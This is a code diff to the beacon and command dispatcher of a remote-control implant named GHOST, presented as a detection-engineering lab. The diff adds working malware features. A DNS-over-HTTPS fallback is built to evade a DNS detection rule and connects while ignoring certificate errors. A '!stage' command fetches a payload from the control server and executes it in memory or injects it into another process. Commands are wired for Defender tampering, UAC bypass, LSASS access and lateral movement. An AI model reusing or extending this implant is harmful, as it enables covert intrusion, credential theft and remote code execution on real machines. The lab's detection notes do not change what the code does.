@@ -1,6 +1,11 @@
 // c2.cpp — GHOST C2 beacon loop and command dispatcher
 #include "c2.hpp"
 #include "config.hpp"
+#include "defender.hpp"
+#include "disk.hpp"
+#include "doh.hpp"
+#include "lateral.hpp"
+#include "privesc.hpp"
 #include "utils.hpp"
 #include "evasion.hpp"
 #include "injection.hpp"
@@ -40,7 +45,12 @@ namespace config {
     static wchar_t s_BeaconToken[65] = {};
     static wchar_t s_UserAgent[32]   = {};
     static wchar_t s_C2Host[128]     = {};
+    static wchar_t s_DohUrl[160]     = {};
     static bool    s_ConfigInit      = false;
+
+#ifndef GHOST_DOH_URL
+#define GHOST_DOH_URL L"https://1.1.1.1/dns-query"
+#endif
 
     static void EnsureInit() {
         if (s_ConfigInit) return;
@@ -51,15 +61,18 @@ namespace config {
 #endif
         auto ua   = XSW(L"Microsoft-WNS/10.0");
         auto host = XSW(GHOST_C2_HOST);
+        auto dohU = XSW(GHOST_DOH_URL);
         wcsncpy_s(s_BeaconToken, tok.str(),  _TRUNCATE);
         wcsncpy_s(s_UserAgent,   ua.str(),   _TRUNCATE);
         wcsncpy_s(s_C2Host,      host.str(), _TRUNCATE);
+        wcsncpy_s(s_DohUrl,      dohU.str(), _TRUNCATE);
         s_ConfigInit = true;
     }
 
     const wchar_t* GetBeaconToken() { EnsureInit(); return s_BeaconToken; }
     const wchar_t* GetUserAgent()   { EnsureInit(); return s_UserAgent;   }
     const wchar_t* GetC2Host()      { EnsureInit(); return s_C2Host;      }
+    const wchar_t* GetDohUrl()      { EnsureInit(); return s_DohUrl;      }
 
 #ifndef GHOST_C2_PORT
 #define GHOST_C2_PORT 443
@@ -419,22 +432,228 @@ static HttpResponse WinHttpRequestAttempt(
     return resp;
 }
 
+// =====================================================================
+//  DoH FALLBACK TRANSPORT (roadmap #1)
+// =====================================================================
+// When the hostname path dies at the transport layer, the beacon resolves its
+// C2 host through DNS-over-HTTPS (RFC 8484, src/doh.cpp) and connects to the
+// literal address. The observable difference is the point of the exercise: no
+// DnsQuery event is emitted for the C2 name, so the EID 22 rule
+// (command_and_control_dns_query_unknown_image.yml) goes blind, and the
+// compensating host-side signal is the connection to the resolver
+// (command_and_control_doh_resolver_unknown_image.yml). Both halves are
+// written down in detections/README.md.
+//
+// Policy, deliberately small enough to reason about:
+//   - one resolution per failure window (DOH_FAIL_BACKOFF_SEC) so a dark
+//     resolver costs one attempt, not one per beacon cycle;
+//   - the literal leads for DOH_IP_TTL_SEC after it has actually carried a
+//     request, so a blocked resolver cannot put a resolve timeout in front of
+//     every request; the hostname path is re-probed when the TTL expires;
+//   - `!doh off` disables all of it at runtime — the lab runs one technique
+//     per experiment, and this one must be switchable without a rebuild.
+//
+// Scope limit, stated where the code lives: WinHTTP derives TLS SNI from the
+// connect target and offers no supported override, so an edge that routes TLS
+// by SNI (ngrok, Cloudflare custom hostnames) rejects the fallback; a bare
+// VPS endpoint works. README section 18 records this.
+static volatile bool g_DohEnabled  = true;
+static std::wstring  g_DohIp;           // literal that carried a request successfully
+static DWORD64       g_DohIpTick   = 0;
+static DWORD64       g_DohFailTick = 0;
+// All four are touched only while g_beaconHttpMtx is held (the !doh handler
+// takes the same lock; the winhttp callbacks below already run under it).
+
+// Cheap literal test — skips the whole fallback when C2_HOST is already an
+// address. Not a strict validator; it only has to recognise the shapes the
+// build-time host can take.
+static bool IsIpLiteral(const std::wstring& host) {
+    if (host.find(L':') != std::wstring::npos) return true;   // IPv6 form
+    int parts = 0;
+    bool digits = false;
+    for (wchar_t c : host) {
+        if (c >= L'0' && c <= L'9')      digits = true;
+        else if (c == L'.') { if (!digits) return false; ++parts; digits = false; }
+        else return false;
+    }
+    return parts == 3 && digits;
+}
+
+// Caller holds g_beaconHttpMtx.
+static std::wstring DohCachedAddress() {
+    if (g_DohIp.empty()) return {};
+    if (GetTickCount64() - g_DohIpTick >= 1000ULL * config::DOH_IP_TTL_SEC) return {};
+    return g_DohIp;
+}
+static void DohCacheSet(const std::wstring& ip) {
+    g_DohIp = ip;
+    g_DohIpTick = GetTickCount64();
+}
+static void DohCacheClear() { g_DohIp.clear(); g_DohIpTick = 0; }
+
+// Caller holds g_beaconHttpMtx. Resolves, rate-limiting failures; caching is
+// the caller's job so an address that cannot be connected to never sticks.
+static std::wstring DohResolveAddress(const std::wstring& host) {
+    const DWORD64 now = GetTickCount64();
+    if (now - g_DohFailTick < 1000ULL * config::DOH_FAIL_BACKOFF_SEC) return {};
+    std::wstring ip = doh::Resolve(host, config::GetDohUrl());
+    if (ip.empty()) {
+        g_DohFailTick = now;
+        DebugLog(L"DoH fallback: resolution failed");
+        return {};
+    }
+    DebugLog(L"DoH fallback: " + host + L" -> " + ip);
+    return ip;
+}
+
+// One-shot request to a literal address with the original host kept in the
+// Host header (WinHTTP would otherwise send Host: <connect target>). Not
+// pooled on purpose: the fallback is the exception path, and pinning the pool
+// to a literal would outlive the TTL that re-probes the hostname.
+static HttpResponse WinHttpRequestViaIp(
+    const std::wstring& ip, const std::wstring& host, INTERNET_PORT port,
+    const std::wstring& verb, const std::wstring& path,
+    const std::string& body, const std::wstring& extraHeaders)
+{
+    HttpResponse resp;
+    static HMODULE hW = []() -> HMODULE {
+        HMODULE m = GetModuleHandleA(XS("winhttp.dll"));
+        return m ? m : LoadLibraryA(XS("winhttp.dll"));
+    }();
+    if (!hW) return resp;
+
+    auto _Open         = HASHPROC(hW, WinHttpOpen);
+    auto _Connect      = HASHPROC(hW, WinHttpConnect);
+    auto _OpenRequest  = HASHPROC(hW, WinHttpOpenRequest);
+    auto _SetOption    = HASHPROC(hW, WinHttpSetOption);
+    auto _AddHeaders   = HASHPROC(hW, WinHttpAddRequestHeaders);
+    auto _SendRequest  = HASHPROC(hW, WinHttpSendRequest);
+    auto _ReceiveResp  = HASHPROC(hW, WinHttpReceiveResponse);
+    auto _QueryHeaders = HASHPROC(hW, WinHttpQueryHeaders);
+    auto _QueryAvail   = HASHPROC(hW, WinHttpQueryDataAvailable);
+    auto _ReadData     = HASHPROC(hW, WinHttpReadData);
+    auto _Close        = HASHPROC(hW, WinHttpCloseHandle);
+    if (!_Open || !_Connect || !_OpenRequest || !_SendRequest || !_ReceiveResp || !_Close)
+        return resp;
+
+    HINTERNET hSes = _Open(config::GetUserAgent(), WINHTTP_ACCESS_TYPE_NO_PROXY,
+                           WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
+    if (!hSes) return resp;
+
+    DWORD timeout = 45000;
+    if (_SetOption) {
+        _SetOption(hSes, WINHTTP_OPTION_CONNECT_TIMEOUT, &timeout, sizeof(timeout));
+        _SetOption(hSes, WINHTTP_OPTION_RECEIVE_TIMEOUT, &timeout, sizeof(timeout));
+        _SetOption(hSes, WINHTTP_OPTION_SEND_TIMEOUT,    &timeout, sizeof(timeout));
+    }
+
+    HINTERNET hCon = _Connect(hSes, ip.c_str(), port, 0);
+    if (!hCon) { _Close(hSes); return resp; }
+
+    HINTERNET hReq = _OpenRequest(hCon, verb.c_str(), path.c_str(), nullptr,
+                                  WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES,
+                                  WINHTTP_FLAG_SECURE);
+    if (!hReq) { _Close(hCon); _Close(hSes); return resp; }
+
+    DWORD flags = SECURITY_FLAG_IGNORE_UNKNOWN_CA |
+                  SECURITY_FLAG_IGNORE_CERT_DATE_INVALID |
+                  SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
+                  SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE;
+    if (_SetOption) _SetOption(hReq, WINHTTP_OPTION_SECURITY_FLAGS, &flags, sizeof(flags));
+
+    auto ctHdr    = XSW(L"Content-Type: application/json\r\nX-Beacon-Token: ");
+    auto ngrokHdr = XSW(L"\r\nngrok-skip-browser-warning: true");
+    std::wstring hdrs = std::wstring(ctHdr.str()) + config::GetBeaconToken() +
+                        ngrokHdr.str() + L"\r\n";
+    // Host names the original endpoint, port included when it is not the
+    // scheme default; a synthetic Host would break vhost-routed servers.
+    hdrs += L"Host: " + host;
+    if (port != 443) hdrs += L":" + std::to_wstring(port);
+    hdrs += L"\r\n";
+    if (!extraHeaders.empty()) { hdrs += extraHeaders; hdrs += L"\r\n"; }
+    if (_AddHeaders)
+        _AddHeaders(hReq, hdrs.c_str(), static_cast<DWORD>(hdrs.size()),
+                    WINHTTP_ADDREQ_FLAG_ADD | WINHTTP_ADDREQ_FLAG_REPLACE);
+
+    BOOL sent = _SendRequest(hReq, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
+                             body.empty() ? WINHTTP_NO_REQUEST_DATA
+                                          : const_cast<char*>(body.data()),
+                             static_cast<DWORD>(body.size()),
+                             static_cast<DWORD>(body.size()), 0);
+    if (!sent || !_ReceiveResp(hReq, nullptr)) {
+        DebugLog(L"DoH fallback: literal path failed");
+        _Close(hReq); _Close(hCon); _Close(hSes);
+        return resp;
+    }
+
+    DWORD statusSize = sizeof(resp.status);
+    if (_QueryHeaders)
+        _QueryHeaders(hReq, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
+                      WINHTTP_HEADER_NAME_BY_INDEX, &resp.status, &statusSize,
+                      WINHTTP_NO_HEADER_INDEX);
+
+    DWORD avail = 0;
+    while (_QueryAvail && _QueryAvail(hReq, &avail) && avail > 0) {
+        std::vector<char> buf(avail);
+        DWORD rd = 0;
+        if (_ReadData && _ReadData(hReq, buf.data(), avail, &rd) && rd > 0)
+            resp.body.append(buf.data(), rd);
+        if (resp.body.size() > config::CMD_OUTPUT_MAX) break;
+    }
+    _Close(hReq); _Close(hCon); _Close(hSes);
+    return resp;
+}
+
 // Public entry: serialised, with one transparent retry when a pooled connection
-// turns out to be stale. SendResult is reachable from the keylog and VNC
-// threads as well as the beacon loop, so the transport cache is mutex-guarded.
+// turns out to be stale, then the DoH-resolved literal when the hostname path
+// is dead. SendResult is reachable from the keylog and VNC threads as well as
+// the beacon loop, so the transport cache is mutex-guarded.
 static HttpResponse WinHttpRequest(
     const std::wstring& host, INTERNET_PORT port,
     const std::wstring& verb, const std::wstring& path,
     const std::string& body, const std::wstring& extraHeaders = L"")
 {
     std::lock_guard<std::mutex> lk(g_beaconHttpMtx);
+    const bool dohCandidate = g_DohEnabled && !IsIpLiteral(host);
+
+    // Sticky literal first while one is fresh — a blocked resolver must not
+    // put a failed hostname attempt in front of every request.
+    if (dohCandidate) {
+        std::wstring ip = DohCachedAddress();
+        if (!ip.empty()) {
+            HttpResponse viaIp = WinHttpRequestViaIp(ip, host, port, verb, path,
+                                                     body, extraHeaders);
+            if (viaIp.status != 0) return viaIp;
+            DohCacheClear();   // dead literal — fall through and re-probe
+        }
+    }
+
     for (int attempt = 0; attempt < 2; ++attempt) {
         bool fresh = false, stale = false;
         HttpResponse resp = WinHttpRequestAttempt(host, port, verb, path, body,
                                                   extraHeaders, fresh, stale);
         if (!stale) return resp;
         CloseBeaconTransport();
-        if (fresh) return resp;   // a brand-new connection already failed
+        if (fresh) {
+            // A brand-new connection already failed: the hostname path is dead
+            // (DNS filtered/sinkholed, or the host is down). One DoH attempt.
+            if (dohCandidate) {
+                std::wstring ip = DohResolveAddress(host);
+                if (!ip.empty()) {
+                    HttpResponse viaIp = WinHttpRequestViaIp(ip, host, port, verb,
+                                                             path, body, extraHeaders);
+                    if (viaIp.status != 0) {
+                        DohCacheSet(ip);
+                        return viaIp;
+                    }
+                    // Resolved but nothing answered (server itself down, or the
+                    // edge rejects the literal): count it as a failed fallback so
+                    // the next beacon does not re-query the resolver every cycle.
+                    g_DohFailTick = GetTickCount64();
+                }
+            }
+            return resp;
+        }
         DebugLog(L"Pooled beacon connection stale, reconnecting");
     }
     return HttpResponse{};
@@ -700,54 +919,6 @@ BOOL SendResult(const std::wstring& sessionId, const std::wstring& tid,
 // =====================================================================
 //  FILELESS POWERSHELL EXECUTOR
 // =====================================================================
-static std::wstring RunFilelessPS(const std::string& b64Command) {
-    wchar_t sysRoot[MAX_PATH] = {};
-    GetEnvironmentVariableW(L"SystemRoot", sysRoot, MAX_PATH);
-    std::wstring ps = std::wstring(sysRoot) +
-                      L"\\System32\\WindowsPowerShell\\v1.0\\powershell.exe";
-    std::wstring cmdLine = L"\"" + ps + L"\" -NoProfile -NonInteractive "
-                           L"-WindowStyle Hidden -ExecutionPolicy Bypass "
-                           L"-EncodedCommand " + UTF8ToWString(b64Command);
-    SECURITY_ATTRIBUTES sa = { sizeof(sa), nullptr, TRUE };
-    HANDLE hRead = nullptr, hWrite = nullptr;
-    if (!CreatePipe(&hRead, &hWrite, &sa, 0))
-        return L"[error: pipe failed]";
-    SetHandleInformation(hRead, HANDLE_FLAG_INHERIT, 0);
-
-    STARTUPINFOW si = {};
-    si.cb = sizeof(si);
-    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
-    si.wShowWindow = SW_HIDE;
-    si.hStdOutput = hWrite;
-    si.hStdError  = hWrite;
-    si.hStdInput  = nullptr; // no console in -mwindows build; NULL avoids INVALID_HANDLE crash
-
-    PROCESS_INFORMATION pi = {};
-    BOOL ok = CreateProcessW(nullptr, &cmdLine[0], nullptr, nullptr, TRUE,
-                             CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi);
-    CloseHandle(hWrite);
-    if (!ok) {
-        CloseHandle(hRead);
-        return L"[error: CreateProcess failed]";
-    }
-
-    std::string output;
-    output.reserve(4096);
-    char buf[4096];
-    DWORD bytesRead = 0;
-    while (output.size() < config::CMD_OUTPUT_MAX) {
-        if (!ReadFile(hRead, buf, sizeof(buf), &bytesRead, nullptr) || bytesRead == 0)
-            break;
-        output.append(buf, bytesRead);
-    }
-    if (WaitForSingleObject(pi.hProcess, config::CMD_TIMEOUT_MS) == WAIT_TIMEOUT)
-        TerminateProcess(pi.hProcess, 1);
-    CloseHandle(pi.hProcess);
-    CloseHandle(pi.hThread);
-    CloseHandle(hRead);
-    return UTF8ToWString(output);
-}
-
 // =====================================================================
 //  CLIPBOARD — read or write system clipboard
 // =====================================================================
@@ -909,6 +1080,88 @@ static std::wstring HandleInject(const std::string& args) {
         return L"[error: " + std::wstring(perr.begin(), perr.end()) + L"]";
     BOOL ok = InjectRemoteProcess(pid, sc.data(), sc.size(), nullptr);
     return ok ? L"[+] Injected " + std::to_wstring(sc.size()) + L" bytes into pid=" + std::to_wstring(pid)
+              : L"[error: injection failed]";
+}
+
+// =====================================================================
+//  SECOND STAGE — fetch the server-staged payload and execute it
+// =====================================================================
+// The operator stages a payload with `c2_cli.py payload upload <file>` (the
+// /payload endpoint that already existed); !stage pulls it over the same
+// authenticated, encrypted channel as every other request and runs it. The
+// fetch is the ingress transfer (T1105) riding the existing C2 connection, so
+// what the detection layer can say about it is exactly what it says about any
+// beacon request; the execution half depends on the mode:
+//
+//   !stage <pid>   remote-thread injection (reuses the syscall chain) ->
+//                  EID 10 for the open and EID 8 for the thread, covered by the
+//                  injection rule
+//   !stage self    allocates RW -> RX in this process and starts a thread ->
+//                  no event at all beyond the network fetch; documented as a
+//                  gap, and noted here because a fault in the payload takes the
+//                  implant down with it, which is the operator's call
+//   !stage info    reports size and SHA-256 of the staged bytes without
+//                  executing anything — the experiment's "before" record
+static std::wstring HandleStage(const std::string& args) {
+    std::string mode = args;
+    while (!mode.empty() && (mode.back() == ' ' || mode.back() == '\r' || mode.back() == '\n'))
+        mode.pop_back();
+    size_t s = mode.find_first_not_of(" \t");
+    mode = (s == std::string::npos) ? "" : mode.substr(s);
+    if (mode != "self" && mode != "info" && mode.empty())
+        return L"Usage: !stage <pid> | !stage self | !stage info";
+
+    HttpResponse r = WinHttpRequest(GetC2Host(), config::C2_PORT, L"GET",
+                                    XSW(L"/payload").str(), "",
+                                    L"X-Session-ID: " + g_SessionId);
+    if (r.status == 404) return L"[error: no payload staged on server]";
+    if (r.status != 200) return L"[error: HTTP " + std::to_wstring(r.status) + L"]";
+    if (r.body.empty())  return L"[error: staged payload is empty]";
+
+    const BYTE* data = reinterpret_cast<const BYTE*>(r.body.data());
+    const SIZE_T size = r.body.size();
+    std::vector<BYTE> digest = Sha256Bytes(data, size);
+    std::wstring sha;
+    for (size_t i = 0; i < digest.size() && i < 8; ++i) {   // first 8 bytes are plenty
+        wchar_t b[4]; swprintf_s(b, L"%02x", digest[i]); sha += b;
+    }
+
+    if (mode == "info") {
+        return L"[stage] staged payload: " + std::to_wstring(size) + L" bytes\r\n"
+               L"  sha256/8: " + sha + L"\r\n"
+               L"  nothing executed — this is the pre-execution record";
+    }
+
+    if (mode == "self") {
+        void* mem = VirtualAlloc(nullptr, size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+        if (!mem) return L"[error: VirtualAlloc failed]";
+        memcpy(mem, data, size);
+        DWORD old = 0;
+        if (!VirtualProtect(mem, size, PAGE_EXECUTE_READ, &old)) {
+            VirtualFree(mem, 0, MEM_RELEASE);
+            return L"[error: VirtualProtect failed]";
+        }
+        HANDLE th = CreateThread(nullptr, 0,
+                                 reinterpret_cast<LPTHREAD_START_ROUTINE>(mem),
+                                 nullptr, 0, nullptr);
+        if (!th) {
+            VirtualFree(mem, 0, MEM_RELEASE);
+            return L"[error: CreateThread failed]";
+        }
+        CloseHandle(th);
+        return L"[stage] executed " + std::to_wstring(size) + L" bytes in-process (sha256/8 "
+               + sha + L")\r\n"
+               L"  telemetry: none in Sysmon beyond the fetch — self-execution is a "
+               L"documented gap; a fault in the payload takes the implant down with it";
+    }
+
+    DWORD pid = static_cast<DWORD>(atol(mode.c_str()));
+    if (!pid) return L"Usage: !stage <pid> | !stage self | !stage info";
+    BOOL ok = InjectRemoteProcess(pid, data, size, nullptr);
+    return ok ? (L"[stage] injected " + std::to_wstring(size) + L" bytes into pid=" +
+                std::to_wstring(pid) + L" (sha256/8 " + sha + L")\r\n"
+                L"  telemetry: EID 10 (open) + EID 8 (remote thread) — covered by the "
+                L"injection rule")
               : L"[error: injection failed]";
 }
 
@@ -1786,6 +2039,41 @@ static std::wstring HandleGetPid(const std::string& /*args*/) {
 }
 
 // =====================================================================
+//  DoH TOGGLE — `!doh [on|off|status]`
+// =====================================================================
+// The fallback is switchable at runtime because the lab runs one technique per
+// experiment: DNS filtering + `!doh on` is the DoH experiment, and the same
+// VM without the toggle is the control. `!doh status` doubles as evidence for
+// the audit trail — it names the endpoint and the literal in use.
+static std::wstring HandleDoh(const std::string& args) {
+    size_t s = args.find_first_not_of(" \t\r\n");
+    std::string v = (s == std::string::npos) ? "" : args.substr(s);
+    while (!v.empty() && (v.back() == ' ' || v.back() == '\t' ||
+                          v.back() == '\r' || v.back() == '\n'))
+        v.pop_back();
+
+    if (v.empty() || v == "status") {
+        std::lock_guard<std::mutex> lk(g_beaconHttpMtx);
+        std::wstring out = std::wstring(L"[+] DoH fallback: ") +
+                           (g_DohEnabled ? L"on" : L"off") +
+                           L"\r\nendpoint: " + config::GetDohUrl();
+        if (!g_DohIp.empty())
+            out += L"\r\nlast address: " + g_DohIp +
+                   L"\r\nage(s): " + std::to_wstring(
+                       (GetTickCount64() - g_DohIpTick) / 1000ULL);
+        return out;
+    }
+    if (v == "on")  { g_DohEnabled = true;  return L"[+] DoH fallback enabled"; }
+    if (v == "off") {
+        g_DohEnabled = false;
+        std::lock_guard<std::mutex> lk(g_beaconHttpMtx);
+        DohCacheClear();
+        return L"[+] DoH fallback disabled";
+    }
+    return L"Usage: !doh [on|off|status]";
+}
+
+// =====================================================================
 //  COMMAND TABLE
 // =====================================================================
 struct CmdEntry {
@@ -1831,6 +2119,22 @@ static const CmdEntry kCmdTable[] = {
     { "!kill ",        false, HandleKillProcess },
     { "!env",          true,  HandleEnvDump },
     { "!env ",         false, HandleEnvDump },
+    { "!doh",          true,  HandleDoh },
+    { "!doh ",         false, HandleDoh },
+    { "!defender",     true,  HandleDefender },
+    { "!defender ",    false, HandleDefender },
+    { "!diskread",     true,  HandleDiskRead },
+    { "!diskread ",    false, HandleDiskRead },
+    { "!uac",          true,  HandleUac },
+    { "!uac ",         false, HandleUac },
+    { "!service",      true,  HandleService },
+    { "!service ",     false, HandleService },
+    { "!lsass",        true,  HandleLsass },
+    { "!lsass ",       false, HandleLsass },
+    { "!lateral",      true,  HandleLateral },
+    { "!lateral ",     false, HandleLateral },
+    { "!stage",        true,  HandleStage },
+    { "!stage ",       false, HandleStage },
     { "!getpid",       true,  HandleGetPid },
     { "!getpid ",      false, HandleGetPid },
     { "exit",          true,  nullptr },
